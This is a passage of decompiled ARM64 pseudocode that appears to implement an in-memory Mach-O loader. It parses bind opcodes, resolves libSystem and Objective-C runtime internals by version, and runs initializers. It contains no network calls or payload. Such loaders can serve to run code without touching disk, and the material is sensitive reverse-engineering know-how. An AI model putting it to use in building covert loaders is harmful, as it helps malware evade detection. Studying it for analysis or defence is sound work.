              if ( v287 > v286 || v287 + *(unsigned int *)(v394 + 168) <= v286 )
              {
                v86 = 9502724;
                goto LABEL_485;
              }
              if ( !(unsigned int)sub_6F10(v394, v286, &v415, v409, v392) )
              {
                v86 = 9502723;
                goto LABEL_485;
              }
              v285 = v415;
            }
            *v282 = v285;
          }
LABEL_485:
          ++v282;
          LODWORD(v275) = v275 + 1;
          if ( !--v283 )
            goto LABEL_486;
        }
      }
    }
  }
LABEL_383:
  v8 = v86;
  if ( (_DWORD)v86 )
    goto LABEL_402;
  v211 = *(_QWORD *)(v394 + 232);
  if ( v211 )
  {
    sub_4994(v211, -96, 80);
    if ( MEMORY[0xFFFFFFFFFFFFFFD0] )
    {
      v212 = (_QWORD *)v394;
      v213 = *(_QWORD *)(v394 + 232) + 80LL;
      sub_5480(v213, *(_QWORD *)(v394 + 240), *(_QWORD *)(v394 + 248));
      sub_5480(v213, v212[32], v212[33]);
      sub_5480(v213, v212[34], v212[35]);
    }
  }
  v8 = sub_54FC(v394, v392);
  if ( (_DWORD)v8 )
    goto LABEL_402;
  v216 = v392;
  if ( !*v403 )
    goto LABEL_662;
  v46 = 98312;
  v411 = 0;
  v412 = 0;
  sub_4B68(&v415, 0, 32);
  sub_5C(*v403, (__int64)"object_getClass", v217, v218);
  sub_10EC();
  v220 = v219;
  v223 = sub_5C(*v403, (__int64)"_objc_patch_root_of_class", v221, v222);
  sub_5C(*v403, (__int64)"_objc_map_images", v224, v225);
  sub_10EC();
  if ( !v220 )
    return 98306;
  v229 = v226;
  if ( !(unsigned int)sub_5C(v220, (__int64)&v415, v227, v228) )
    return 98307;
  v230 = v416[0];
  v8 = sub_7220("__TEXT", "__text", v416[0], &v414, &v413);
  if ( !(_DWORD)v8 )
  {
    v231 = v416[0];
    v232 = *(_DWORD *)(v416[0] + 16LL);
    if ( !v232 )
      return (unsigned int)(v46 + 1);
    v233 = (_DWORD *)(v416[0] + 32LL);
    while ( 1 )
    {
      if ( *v233 == 37 )
      {
        v290 = 2;
        goto LABEL_496;
      }
      if ( *v233 == 50 )
        break;
      v233 = (_DWORD *)((char *)v233 + (unsigned int)v233[1]);
      if ( !--v232 )
        return (unsigned int)(v46 + 1);
    }
    v290 = 3;
LABEL_496:
    v291 = v233[v290];
    v292 = v414;
    v408 = v413;
    if ( v223 && (unsigned int)v291 >= 0x110000 )
    {
      v293 = sub_7220("__AUTH_CONST", "__const", v416[0], v418, &v417);
      if ( v293 == 98310 )
        v293 = sub_7220("__DATA_CONST", "__const", v231, v418, &v417);
      if ( !v293 && v418[0] && (unsigned __int64)v417 >= 0x19 && (unsigned __int64)v417 <= 0xFFFFFFFE && v417 >= 32 )
      {
        v298 = (_QWORD *)(v418[0] + 24LL);
        while ( *v298 != v223 )
        {
          if ( (unsigned __int64)++v298 > v417 + v418[0] - 8 )
            goto LABEL_501;
        }
        v308 = *(v298 - 3);
        v309 = *(v298 - 1);
        sub_10EC();
        v311 = v310;
        sub_10EC();
        v313 = v292 + v408;
        v314 = v311 >= v292 && v313 > v311;
        v315 = v314 && v312 >= v292;
        if ( v315 && v313 > v312 )
        {
          v411 = v309;
          v412 = v308;
          if ( v229 )
          {
            sub_10EC();
            v318 = v317;
            sub_10EC();
LABEL_661:
            *(_DWORD *)(v394 + 136) = v291;
            *(_QWORD *)(v394 + 128) = v230;
            *(_QWORD *)(v394 + 144) = v318;
            *(_QWORD *)(v394 + 152) = v319;
            v323 = *(unsigned int **)(v394 + 88);
            v416[0] = 0;
            v416[1] = 0;
            v415 = v323;
            sub_5C(1, (__int64)v416, (__int64)&v415, v320);
            v216 = v392;
            v8 = sub_54FC(v394, v392);
            if ( (_DWORD)v8 )
              return v8;
LABEL_662:
            if ( *(_DWORD *)(*(_QWORD *)v394 + 16LL) )
            {
              v324 = 0;
              v325 = *(_QWORD *)(v394 + 96) - *(_QWORD *)(v394 + 80);
              v326 = *(_QWORD *)(v394 + 104) + 32LL;
              while ( *(_DWORD *)v326 != 25
                   || !(unsigned int)sub_4C18(v326 + 8, "__PAGEZERO")
                   || !(unsigned int)sub_5C74(v216, v325 + *(_QWORD *)(v326 + 24)) )
              {
                v326 += *(unsigned int *)(v326 + 4);
                if ( (unsigned int)++v324 >= *(_DWORD *)(*(_QWORD *)v394 + 16LL) )
                  goto LABEL_668;
              }
              v8 = 81925;
              goto LABEL_402;
            }
LABEL_668:
            v327 = *(_BYTE *)(v394 + 172);
            if ( (v327 & 0x10) != 0 )
            {
LABEL_709:
              v8 = 0;
              goto LABEL_402;
            }
            v8 = 106497;
            if ( !*v216 || !v216[1] )
              goto LABEL_402;
            if ( (*(_BYTE *)(v394 + 172) & 5) != 0 )
            {
              v328 = sub_5C((__int64)"/usr/lib/libSystem.dylib", 17, v214, v215);
              if ( v328 )
              {
                v331 = v328;
                sub_5C(v328, (__int64)"_NSGetMachExecuteHeader", v329, v330);
                sub_10EC();
                if ( v335 )
                {
                  sub_5C(v331, (__int64)"_NSGetArgc", v333, v334);
                  sub_10EC();
                  if ( v336 )
                  {
                    sub_5C(v331, (__int64)"_NSGetArgv", v333, v334);
                    sub_10EC();
                    if ( v337 )
                    {
                      sub_5C(v331, (__int64)"_NSGetEnviron", v333, v334);
                      sub_10EC();
                      if ( v338 )
                      {
                        sub_5C(v331, (__int64)"_NSGetProgname", v333, v334);
                        sub_10EC();
                        if ( v339 )
                        {
                          v340 = sub_5C(v339, v332, v333, v334);
                          *(_QWORD *)(v394 + 184) = v340;
                          v344 = sub_5C(v340, v341, v342, v343);
                          *(_QWORD *)(v394 + 192) = v344;
                          v348 = sub_5C(v344, v345, v346, v347);
                          *(_QWORD *)(v394 + 200) = v348;
                          v352 = sub_5C(v348, v349, v350, v351);
                          *(_QWORD *)(v394 + 208) = v352;
                          *(_QWORD *)(v394 + 216) = sub_5C(v352, v353, v354, v355);
                          sub_5C(v331, v356, v357, v358);
                          v327 = *(_BYTE *)(v394 + 172);
                          goto LABEL_679;
                        }
                      }
                    }
                  }
                }
                sub_5C(v331, v332, v333, v334);
                v379 = -12286;
              }
              else
              {
                v379 = -12287;
              }
              v8 = (v379 | 0xFFF60000) + 708609;
              goto LABEL_402;
            }
LABEL_679:
            v359 = *(_QWORD *)(v394 + 80);
            if ( (v327 & 4) != 0 )
            {
              v360 = *(_QWORD *)v394;
              if ( *(_DWORD *)(*(_QWORD *)v394 + 16LL) )
              {
                v361 = 0;
                v362 = *(_QWORD *)(v394 + 96) - v359;
                v363 = *(_QWORD *)(v394 + 104) + 32LL;
                do
                {
                  if ( *(_DWORD *)v363 == 26 )
                  {
                    v364 = *(_QWORD *)(v363 + 8) + v362;
                    v365 = *(_QWORD *)(v394 + 96);
                    if ( v365 > v364 || v365 + *(unsigned int *)(v394 + 168) <= v364 )
                      goto LABEL_714;
                    sub_5C(**(unsigned int **)(v394 + 192), **(_QWORD **)(v394 + 200), **(_QWORD **)(v394 + 208), 0);
                    v360 = *(_QWORD *)v394;
                  }
                  v363 += *(unsigned int *)(v363 + 4);
                  ++v361;
                }
                while ( v361 < *(_DWORD *)(v360 + 16) );
                v359 = *(_QWORD *)(v394 + 80);
                v327 = *(_BYTE *)(v394 + 172);
              }
            }
            if ( (v327 & 1) != 0 )
            {
              v367 = *(_QWORD *)v394;
              if ( *(_DWORD *)(*(_QWORD *)v394 + 16LL) )
              {
                v368 = 0;
                v369 = *(_QWORD *)(v394 + 88) - v359;
                v370 = (_DWORD *)(*(_QWORD *)(v394 + 104) + 32LL);
                while ( 1 )
                {
                  if ( *v370 == 25 )
                  {
                    v371 = v370 + 18;
                    v372 = (unsigned __int64)&v370[20 * v370[16] + 18];
                    if ( v372 > (unsigned __int64)(v370 + 18) )
                      break;
                  }
LABEL_707:
                  v8 = 0;
                  v370 = (_DWORD *)((char *)v370 + (unsigned int)v370[1]);
                  if ( (unsigned int)++v368 >= *(_DWORD *)(v367 + 16) )
                    goto LABEL_402;
                }
                while ( *((_BYTE *)v371 + 64) != 9 || *((_QWORD *)v371 + 5) < 8u )
                {
LABEL_705:
                  v371 += 20;
                  if ( (unsigned __int64)v371 >= v372 )
                  {
                    v367 = *(_QWORD *)v394;
                    goto LABEL_707;
                  }
                }
                v373 = 0;
                v374 = v369 + *((_QWORD *)v371 + 4);
                v375 = 1;
                while ( 1 )
                {
                  v376 = *(_QWORD *)(v374 + 8 * v373);
                  v377 = *(_QWORD *)(v394 + 88);
                  if ( v377 > v376 || v377 + *(unsigned int *)(v394 + 168) <= v376 )
                    break;
                  sub_5C(**(unsigned int **)(v394 + 192), **(_QWORD **)(v394 + 200), **(_QWORD **)(v394 + 208), 0);
                  v373 = v375++;
                  if ( v373 >= *((_QWORD *)v371 + 5) >> 3 )
                    goto LABEL_705;
                }
LABEL_714:
                v8 = 73736;
                goto LABEL_402;
              }
            }
            goto LABEL_709;
          }
        }
      }
    }
LABEL_501:
    if ( v291 >= 983040 )
    {
      if ( v291 <= 985087 )
      {
        if ( v291 > 984063 )
        {
          if ( v291 > 984575 )
          {
            if ( v291 == 984576 )
              goto LABEL_568;
            v297 = 1792;
          }
          else
          {
            if ( v291 == 984064 )
              goto LABEL_568;
            v297 = 1280;
          }
        }
        else if ( v291 > 983551 )
        {
          if ( v291 == 983552 )
            goto LABEL_568;
          v297 = 768;
        }
        else
        {
          if ( v291 == 983040 )
            goto LABEL_568;
          v297 = 256;
        }
        v299 = v297 | 0xF0000;
      }
      else
      {
        if ( v291 <= 1049343 )
        {
          if ( v291 <= 1048831 )
          {
            if ( v291 == 985088 || v291 == 0x100000 )
              goto LABEL_568;
LABEL_614:
            v234 = -32760;
            return v234 | 0x10000u;
          }
          if ( v291 == 1048832 )
            goto LABEL_568;
          v295 = 512;
        }
        else if ( v291 <= 1049855 )
        {
          if ( v291 == 1049344 )
            goto LABEL_568;
          v295 = 1024;
        }
        else
        {
          if ( v291 == 1049856 || v291 == 1050368 )
            goto LABEL_568;
          v295 = 1536;
        }
        v299 = v295 | 0x100000;
      }
    }
    else if ( v291 < 917504 )
    {
      if ( v291 > 852991 )
      {
        if ( v291 > 853503 )
        {
          if ( v291 == 853504 )
            goto LABEL_568;
          v296 = 1792;
        }
        else
        {
          if ( v291 == 852992 )
            goto LABEL_568;
          v296 = 1280;
        }
      }
      else if ( v291 > 852479 )
      {
        if ( v291 == 852480 )
          goto LABEL_568;
        v296 = 768;
      }
      else
      {
        if ( v291 == 851968 )
          goto LABEL_568;
        v296 = 256;
      }
      v299 = v296 | 0xD0000;
    }
    else
    {
      if ( v291 <= 918527 )
      {
        if ( v291 > 918015 )
        {
          if ( v291 == 918016 )
            goto LABEL_568;
          v294 = 768;
        }
        else
        {
          if ( v291 == 917504 )
            goto LABEL_568;
          v294 = 256;
        }
      }
      else if ( v291 <= 919039 )
      {
        if ( v291 == 918528 )
          goto LABEL_568;
        v294 = 1280;
      }
      else
      {
        if ( v291 == 919040 || v291 == 919296 )
          goto LABEL_568;
        v294 = 2048;
      }
      v299 = v294 | 0xE0000;
    }
    if ( v291 == v299 )
    {
LABEL_568:
      if ( (unsigned int)v291 <= 0xEFFFF )
        v300 = 917503;
      else
        v300 = 0xFFFFF;
      if ( (unsigned int)v291 <= 0xEFFFF )
        v301 = 1;
      else
        v301 = 6;
      if ( (unsigned int)v291 <= 0xEFFFF )
        v302 = "_objc_flush_caches";
      else
        v302 = "objc_retainAutorelease";
      if ( v300 >= v291 )
        v303 = v301;
      else
        v303 = 5;
      v8 = ((__int64 (__fastcall *)(_QWORD *, const char *, __int64, unsigned __int64, __int64, __int64 *))loc_7390)(
             v392,
             v302,
             v303,
             v292,
             v408,
             &v412);
      if ( (_DWORD)v8 )
        return v8;
      if ( v291 >= 983040 )
      {
        if ( v291 <= 985087 )
        {
          if ( v291 > 984063 )
          {
            if ( v291 > 984575 )
            {
              if ( v291 == 984576 )
                goto LABEL_648;
              v307 = 1792;
            }
            else
            {
              if ( v291 == 984064 )
                goto LABEL_648;
              v307 = 1280;
            }
          }
          else if ( v291 > 983551 )
          {
            if ( v291 == 983552 )
              goto LABEL_648;
            v307 = 768;
          }
          else
          {
            if ( v291 == 983040 )
              goto LABEL_648;
            v307 = 256;
          }
          v321 = v307 | 0xF0000;
        }
        else
        {
          if ( v291 <= 1049343 )
          {
            if ( v291 <= 1048832 )
              goto LABEL_648;
            v305 = 512;
          }
          else if ( v291 <= 1049855 )
          {
            if ( v291 == 1049344 )
              goto LABEL_648;
            v305 = 1024;
          }
          else
          {
            if ( v291 == 1049856 || v291 == 1050368 )
              goto LABEL_648;
            v305 = 1536;
          }
          v321 = v305 | 0x100000;
        }
      }
      else
      {
        if ( v291 >= 917504 )
        {
          if ( v291 <= 918527 )
          {
            if ( v291 > 918015 )
            {
              if ( v291 != 918016 )
              {
                v304 = 768;
                goto LABEL_638;
              }
            }
            else if ( v291 != 917504 )
            {
              v304 = 256;
              goto LABEL_638;
            }
          }
          else if ( v291 <= 919039 )
          {
            if ( v291 != 918528 )
            {
              v304 = 1280;
              goto LABEL_638;
            }
          }
          else if ( v291 != 919040 && v291 != 919296 )
          {
            v304 = 2048;
LABEL_638:
            v321 = v304 | 0xE0000;
            goto LABEL_647;
          }
LABEL_648:
          if ( (unsigned int)v291 >> 20 )
          {
            v322 = 8;
          }
          else
          {
            if ( (unsigned int)v291 >> 10 <= 0x3C0 )
              v322 = 5;
            else
              v322 = 6;
            if ( (unsigned int)v291 <= 0xEFFFF )
            {
              if ( (unsigned int)v291 <= 0xDFFFF )
              {
                if ( (unsigned int)v291 >> 9 <= 0x680 )
                  v322 = 4;
                else
                  v322 = 8;
              }
              else
              {
                v322 = 12;
              }
            }
          }
          v8 = ((__int64 (__fastcall *)(_QWORD *, const char *, __int64, unsigned __int64, __int64, __int64 *))loc_7390)(
                 v392,
                 "_objc_flush_caches",
                 v322,
                 v292,
                 v408,
                 &v411);
          if ( (_DWORD)v8 )
            return v8;
          v319 = v411;
          v318 = v412;
          goto LABEL_661;
        }
        if ( v291 > 852991 )
        {
          if ( v291 > 853503 )
          {
            if ( v291 == 853504 )
              goto LABEL_648;
            v306 = 1792;
          }
          else
          {
            if ( v291 == 852992 )
              goto LABEL_648;
            v306 = 1280;
          }
        }
        else if ( v291 > 852479 )
        {
          if ( v291 == 852480 )
            goto LABEL_648;
          v306 = 768;
        }
        else
        {
          if ( v291 == 851968 )
            goto LABEL_648;
          v306 = 256;
        }
        v321 = v306 | 0xD0000;
      }
LABEL_647:
      v8 = 98312;
      if ( v291 != v321 )
        return v8;
      goto LABEL_648;
    }
    goto LABEL_614;
  }
  return v8;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_464C
// Address:  0x464C  Size: 252 bytes
// Calls:    sub_4C18, sub_5C
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_464C(__int64 a1, _QWORD *a2, __int64 a3, _QWORD *a4)
{
  __int64 v4; // x19
  __int64 v7; // x9
  __int64 v8; // x8
  unsigned __int64 v10; // x24
  _QWORD *v11; // x23

  v4 = 708609;
  if ( a3 )
  {
    if ( a4 )
    {
      if ( a2 )
      {
        v7 = a2[7];
        if ( v7 )
        {
          if ( a2[9] )
          {
            *a4 = 0;
            v8 = a2[6];
            v4 = 73729;
            if ( *(_DWORD *)(v8 + 12) )
            {
              v10 = 0;
              v11 = (_QWORD *)(v7 + 8);
              do
              {
                if ( (*((_BYTE *)v11 - 4) & 0xE1) == 1 )
                {
                  if ( !(unsigned int)sub_4C18(a3, a2[9] + *((unsigned int *)v11 - 2)) )
                  {
                    v4 = 0;
                    *a4 = a2[12] - a2[10] + *v11;
                    return v4;
                  }
                  v8 = a2[6];
                }
                ++v10;
                v11 += 2;
              }
              while ( v10 < *(unsigned int *)(v8 + 12) );
            }
          }
        }
      }
    }
  }
  return v4;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_4748
// Address:  0x4748  Size: 588 bytes
// Calls:    sub_5C, sub_5C74, sub_4B68, sub_5ADC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_4748(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v5; // x20
  int v6; // w8
  __int64 v7; // x8
  int v8; // w21
  __int64 v9; // x22
  _DWORD *v10; // x23
  _DWORD *v11; // x25
  unsigned __int64 v12; // x26
  unsigned __int64 v13; // x8
  __int64 v14; // x27
  __int64 v15; // x28
  unsigned __int64 v16; // x8
  unsigned __int64 v17; // x9
  __int64 v19; // x3
  __int64 v20; // x21
  __int64 v21; // x1
  int v22; // w0

  v5 = a1;
  v6 = *(char *)(a2 + 172);
  if ( v6 < 0 )
    goto LABEL_36;
  if ( (v6 & 0x10) != 0 || (v6 & 2) == 0 || (v7 = *(_QWORD *)a2, !*(_DWORD *)(*(_QWORD *)a2 + 16LL)) )
  {
LABEL_20:
    if ( *(_QWORD *)(a2 + 120) )
      sub_5C(0, *(_QWORD *)(a2 + 88), a3, a4);
    v20 = 81931;
    if ( (unsigned int)sub_5C74(v5, *(_QWORD *)(a2 + 88)) )
      goto LABEL_37;
    sub_4B68(*(_QWORD *)(a2 + 88), 0, *(unsigned int *)(a2 + 168));
    if ( *(_QWORD *)(a2 + 120) )
    {
      if ( *(_BYTE *)(v5 + 1477) && (unsigned int)sub_5C74(v5, *(_QWORD *)(a2 + 88)) )
        goto LABEL_37;
      goto LABEL_36;
    }
    v21 = *(_QWORD *)(a2 + 88);
    if ( *(_BYTE *)(v5 + 1477) )
    {
      if ( (unsigned int)sub_5C74(v5, v21) )
        v22 = -1;
      else
        v22 = 0;
      if ( !v22 )
        goto LABEL_36;
LABEL_35:
      v20 = 81932;
LABEL_37:
      sub_4B68(a2, 0, 288);
      sub_5ADC(v5, a2, 288);
      return v20;
    }
    if ( *(_QWORD *)(v5 + 176) && (unsigned int)sub_5C(v5, v21, *(unsigned int *)(a2 + 168), v19) )
      goto LABEL_35;
LABEL_36:
    v20 = 0;
    goto LABEL_37;
  }
  v8 = 0;
  v9 = *(_QWORD *)(a2 + 88) - *(_QWORD *)(a2 + 80);
  v10 = (_DWORD *)(*(_QWORD *)(a2 + 104) + 32LL);
  while ( 1 )
  {
    if ( *v10 == 25 )
    {
      v11 = v10 + 18;
      v12 = (unsigned __int64)&v10[20 * v10[16] + 18];
      if ( v12 > (unsigned __int64)(v10 + 18) )
        break;
    }
LABEL_19:
    v10 = (_DWORD *)((char *)v10 + (unsigned int)v10[1]);
    if ( (unsigned int)++v8 >= *(_DWORD *)(v7 + 16) )
      goto LABEL_20;
  }
  while ( 1 )
  {
    if ( *((_BYTE *)v11 + 64) == 10 )
    {
      v13 = *((_QWORD *)v11 + 5);
      if ( (unsigned int)(v13 >> 3) )
        break;
    }
LABEL_17:
    v11 += 20;
    if ( (unsigned __int64)v11 >= v12 )
    {
      v7 = *(_QWORD *)a2;
      goto LABEL_19;
    }
  }
  v14 = 8LL * (unsigned int)(v13 >> 3);
  v15 = v9 + *((_QWORD *)v11 + 4) - 8;
  while ( 1 )
  {
    v16 = *(_QWORD *)(v15 + v14);
    v17 = *(_QWORD *)(a2 + 88);
    if ( v17 > v16 || v17 + *(unsigned int *)(a2 + 168) <= v16 )
      return 73737;
    a1 = sub_5C(a1, a2, a3, a4);
    v14 -= 8;
    if ( !v14 )
      goto LABEL_17;
  }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_4994
// Address:  0x4994  Size: 144 bytes
// Calls:    sub_5C
// Xrefs:    7 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_4994(__int64 result, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 i; // [xsp+0h] [xbp-30h]

  for ( i = 0; i < a3; ++i )
    *(_BYTE *)(result + i) = *(_BYTE *)(a2 + i);
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_4A24
// Address:  0x4A24  Size: 324 bytes
// Calls:    sub_5C
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_4A24(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 j; // [xsp+0h] [xbp-40h]
  char v6; // [xsp+Bh] [xbp-35h]
  int v7; // [xsp+Ch] [xbp-34h]
  unsigned __int64 i; // [xsp+10h] [xbp-30h]
  __int64 v9; // [xsp+38h] [xbp-8h]

  for ( i = 0; i < a2 - a4; i += 4LL )
  {
    v6 = 1;
    for ( j = 0; j < a4; j += 4LL )
    {
      if ( *(_DWORD *)(a1 + i + j) != *(_DWORD *)(a3 + j) )
      {
        v6 = 0;
        break;
      }
    }
    if ( (v6 & 1) != 0 )
    {
      v9 = a1 + i;
      v7 = 1;
    }
    else
    {
      v7 = 0;
    }
    if ( v7 )
      goto LABEL_14;
  }
  v7 = 2;
LABEL_14:
  if ( v7 != 1 )
    return 0;
  return v9;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_4B68
// Address:  0x4B68  Size: 176 bytes
// Calls:    sub_5C
// Xrefs:    14 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_4B68(__int64 result, char a2, unsigned __int64 a3)
{
  unsigned __int64 i; // [xsp+0h] [xbp-20h]
  unsigned __int64 j; // [xsp+0h] [xbp-20h]

  for ( i = 0; i < a3; ++i )
    *(_BYTE *)(result + i) = a2 + 1;
  for ( j = 0; j < a3; ++j )
    *(_BYTE *)(result + j) = a2;
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_4C18
// Address:  0x4C18  Size: 156 bytes
// Calls:    sub_5C
// Xrefs:    27 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_4C18(char *a1, char *a2)
{
  char *v2; // x8
  char *v3; // x8
  char v5; // [xsp+7h] [xbp-19h]

  do
  {
    v2 = a2++;
    v5 = *v2;
    v3 = a1++;
    if ( *v3 != v5 )
      return 1;
  }
  while ( v5 );
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_4CB4
// Address:  0x4CB4  Size: 208 bytes
// Calls:    sub_5C
// Xrefs:    4 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_4CB4(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 i; // [xsp+8h] [xbp-28h]

  for ( i = 0; i < a3; ++i )
  {
    if ( *(char *)(a2 + i) != *(char *)(a1 + i) )
      return 1;
    if ( !*(_BYTE *)(a2 + i) )
      break;
  }
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_4D84
// Address:  0x4D84  Size: 80 bytes
// Calls:    sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_4D84(int a1, int a2)
{
  __int64 v2; // x8

  if ( a1 < a2 )
    return 0;
  LODWORD(v2) = 0;
  do
  {
    a1 -= a2;
    v2 = (unsigned int)(v2 + 1);
  }
  while ( a1 >= a2 );
  return v2;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_4DD4
// Address:  0x4DD4  Size: 44 bytes
// Calls:    sub_5C
// Xrefs:    5 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_4DD4(int a1, int a2)
{
  return (unsigned int)(a1 * a2);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_4E00
// Address:  0x4E00  Size: 56 bytes
// Calls:    sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_4E00(__int64 result, _DWORD *a2, __int64 a3, _QWORD *a4)
{
  if ( a2 )
  {
    if ( a4 )
    {
      *a2 = result;
      *a4 = a3;
    }
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_4E38
// Address:  0x4E38  Size: 1608 bytes
// Calls:    sub_6760, sub_4DD4, sub_66BC, sub_5ADC, sub_5B4C, sub_4B68, sub_651C, sub_5C
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_4E38(int a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v6; // x8
  __int64 v7; // x9
  unsigned __int8 *v8; // x23
  unsigned int *v9; // x8
  __int64 v10; // x9
  unsigned __int64 v11; // x19
  unsigned int v12; // w21
  __int64 v13; // x25
  __int64 v14; // x27
  unsigned __int8 *v15; // x26
  unsigned int v16; // t1
  __int64 v17; // x28
  unsigned __int8 *v18; // x24
  int v19; // w8
  __int64 v20; // x0
  unsigned int v21; // w9
  __int64 v22; // x8
  unsigned int v23; // w9
  unsigned __int8 *v24; // x10
  char v25; // w11
  char v26; // t1
  unsigned __int64 v27; // x12
  unsigned __int64 v29; // x28
  unsigned int v30; // w9
  unsigned __int8 *v31; // x8
  char v32; // w10
  char v33; // t1
  unsigned __int64 v34; // x11
  __int64 v35; // x8
  unsigned int v36; // w9
  char v37; // w10
  char v38; // t1
  unsigned __int64 v39; // x11
  unsigned int v40; // w8
  char v41; // w9
  char v42; // t1
  unsigned __int64 v43; // x10
  __int64 v44; // x0
  __int64 v45; // x8
  unsigned int v46; // w9
  char v47; // w10
  char v48; // t1
  unsigned __int64 v49; // x11
  __int64 v50; // x8
  unsigned int v51; // w9
  char v52; // w10
  char v53; // t1
  unsigned __int64 v54; // x11
  unsigned __int64 v55; // x1
  char v56; // w8
  char v57; // t1
  unsigned __int64 v58; // x9
  __int64 v59; // x0
  int v60; // w8
  __int64 v61; // x9
  unsigned int v62; // w10
  char v63; // w11
  char v64; // t1
  unsigned __int64 v65; // x12
  __int64 v66; // x19
  unsigned int v67; // w24
  unsigned __int64 v70; // [xsp+8h] [xbp-78h]
  __int64 v71; // [xsp+10h] [xbp-70h]
  unsigned __int8 *v72; // [xsp+18h] [xbp-68h]
  unsigned __int8 v73; // [xsp+24h] [xbp-5Ch]

  v6 = 9502728;
  if ( a1 == 1 )
  {
    v10 = *(_QWORD *)(a2 + 32);
    v8 = (unsigned __int8 *)(*(_QWORD *)(a2 + 104) + *(unsigned int *)(v10 + 32));
    v9 = (unsigned int *)(v10 + 36);
  }
  else
  {
    if ( a1 )
      return v6;
    v7 = *(_QWORD *)(a2 + 32);
    v8 = (unsigned __int8 *)(*(_QWORD *)(a2 + 104) + *(unsigned int *)(v7 + 16));
    v9 = (unsigned int *)(v7 + 20);
  }
  v6 = *v9;
  if ( !(_DWORD)v6 )
    return v6;
  v71 = 0;
  v72 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = &v8[v6];
  v73 = 1;
  while ( 1 )
  {
    v16 = *v8;
    v17 = v16 & 0xF;
    v18 = v8 + 1;
    v19 = v16 >> 4;
    if ( v16 >> 4 > 6 )
      break;
    if ( v19 > 3 )
    {
      ++v8;
      if ( v19 == 4 )
      {
        while ( v8 != v15 )
        {
          if ( !*v8++ )
          {
            v72 = v18;
            goto LABEL_92;
          }
        }
        v72 = 0;
        v8 = v18;
LABEL_92:
        BYTE4(v71) = v17;
        goto LABEL_103;
      }
      if ( v19 != 5 )
      {
        if ( v19 == 6 )
        {
          v22 = 0;
          v23 = 0;
          v24 = v18;
          do
          {
            if ( v24 >= v15 )
            {
              v13 = 0;
              goto LABEL_102;
            }
            v26 = *v24++;
            v25 = v26;
            v27 = (unsigned __int64)(v26 & 0x7F) << v23;
            if ( v23 >= 0x40 )
              v27 = 0;
            v22 |= v27;
            v23 += 7;
          }
          while ( v25 < 0 );
          if ( (v25 & 0x40) != 0 )
            v13 = -1;
          else
            v13 = v22;
          v18 = v24;
        }
        goto LABEL_102;
      }
      v8 = v18;
      v73 = v17;
    }
    else
    {
      if ( v19 != 1 )
      {
        if ( v19 == 2 )
        {
          v12 = 0;
          v40 = 0;
          ++v8;
          while ( v8 < v15 )
          {
            v42 = *v8++;
            v41 = v42;
            v43 = (unsigned __int64)(v42 & 0x7F) << v40;
            if ( v40 >= 0x40 )
              LODWORD(v43) = 0;
            v12 |= v43;
            v40 += 7;
            if ( (v41 & 0x80) == 0 )
              goto LABEL_103;
          }
          v12 = 0;
        }
        else
        {
          v21 = *v8 | 0xFFFFFFF0;
          if ( !(_DWORD)v17 )
            v21 = 0;
          if ( v19 == 3 )
            v12 = v21;
        }
LABEL_102:
        v8 = v18;
        goto LABEL_103;
      }
      ++v8;
      v12 = v17;
    }
LABEL_103:
    if ( v8 >= v15 )
    {
      if ( v11 )
        sub_5ADC(a4, v11, 8LL * (unsigned int)v71);
      return 0;
    }
  }
  if ( v19 <= 9 )
  {
    switch ( v19 )
    {
      case 7:
        v44 = sub_66BC(v17);
        if ( !v44 )
          return 9502729;
        v45 = 0;
        v46 = 0;
        ++v8;
        while ( v8 < v15 )
        {
          v48 = *v8++;
          v47 = v48;
          v49 = (unsigned __int64)(v48 & 0x7F) << v46;
          if ( v46 >= 0x40 )
            v49 = 0;
          v45 |= v49;
          v46 += 7;
          if ( (v47 & 0x80) == 0 )
            goto LABEL_115;
        }
        v45 = 0;
        v8 = v18;
LABEL_115:
        v14 = v44 + v45;
        goto LABEL_103;
      case 8:
        v50 = 0;
        v51 = 0;
        ++v8;
        while ( v8 < v15 )
        {
          v53 = *v8++;
          v52 = v53;
          v54 = (unsigned __int64)(v53 & 0x7F) << v51;
          if ( v51 >= 0x40 )
            v54 = 0;
          v50 |= v54;
          v51 += 7;
          if ( (v52 & 0x80) == 0 )
            goto LABEL_106;
        }
        v50 = 0;
        v8 = v18;
LABEL_106:
        v14 += v50;
        goto LABEL_103;
      case 9:
        v20 = sub_6760(v14, v72, BYTE4(v71), v73, v13, a3, a4, a2, v12);
        if ( (_DWORD)v20 )
          return v20;
        v14 += 8;
        break;
    }
    goto LABEL_102;
  }
  if ( v19 <= 11 )
  {
    if ( v19 == 10 )
    {
      v20 = sub_6760(v14, v72, BYTE4(v71), v73, v13, a3, a4, a2, v12);
      if ( (_DWORD)v20 )
        return v20;
      v35 = 0;
      v36 = 0;
      ++v8;
